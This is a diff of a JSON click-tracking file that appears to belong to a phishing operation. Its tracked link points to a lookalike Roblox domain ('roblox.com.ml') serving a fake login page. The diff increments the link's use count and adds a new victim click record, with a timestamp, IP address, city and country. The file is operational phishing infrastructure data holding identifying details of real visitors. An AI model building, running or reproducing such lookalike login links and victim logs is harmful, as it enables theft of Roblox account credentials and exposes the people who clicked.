@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 288,
+    "useCount": 289,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2416,6 +2416,14 @@
         "city": "Budapest",
         "flag": "🇭🇺",
         "countryCode": "HU"
+      },
+      {
+        "timestamp": 1777011737293,
+        "ip": "165.16.184.112",
+        "country": "South Africa",
+        "city": "Johannesburg",
+        "flag": "🇿🇦",
+        "countryCode": "ZA"
       }
     ]
   },
